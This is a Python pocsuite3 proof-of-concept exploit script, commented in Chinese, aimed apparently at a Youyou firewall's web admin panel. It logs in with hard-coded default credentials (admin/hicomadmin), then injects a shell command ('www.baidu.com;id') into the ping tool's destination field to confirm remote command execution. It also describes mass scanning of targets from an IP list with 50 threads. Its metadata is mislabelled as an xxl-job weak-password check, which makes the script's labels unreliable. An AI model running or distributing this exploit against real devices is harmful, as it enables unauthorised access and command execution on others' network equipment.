from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)
requests.packages.urllib3.disable_warnings()

class XXLJOBPOC(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "mxwl"  # PoC作者的大名
    vulDate = "2022-7-17"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-17"  # 编写 PoC 的日期
    updateDate = "2022-7-17"  # PoC 更新的时间,默认和编写时间一样
    references = []  # 漏洞地址来源,0day不用写
    name = "xxl-job 后台存在弱口令漏洞"  # PoC 名称
    appPowerLink = "www.hechen.com"  # 漏洞厂商主页地址
    appName = "佑友防火墙"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """  title="佑友防火墙"
    佑友防火墙 后台维护工具存在命令执行，由于没有过滤危险字符，导致可以执行任意命令
    """  # 漏洞简要描述
    pocDesc = '''pocsuite -r 佑友防火墙rce.py -f ip.txt --threads 50'''  # POC用法描述

    def _check(self):
        result = []
        # 漏洞验证代码
        try:
            session = requests.session()
            url1 = f"{self.url}/index.php?c=user&a=ajax_save"
            data1 = {"username": "admin", "password": "hicomadmin", "language": "zh-cn"}
            res1 = session.post(url1, data=data1, verify=False)
            # 判断是否存在漏洞
            if 'success' in res1.text:
                url2 = f"{self.url}/index.php?c=maintain&a=ping"
                data2 = {"interface": '', "destip": "www.baidu.com;id"}
                res2 = session.post(url2, data=data2, verify=False)
                if 'uid' in res2.text:
                    result.append(self.url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XXLJOBPOC)
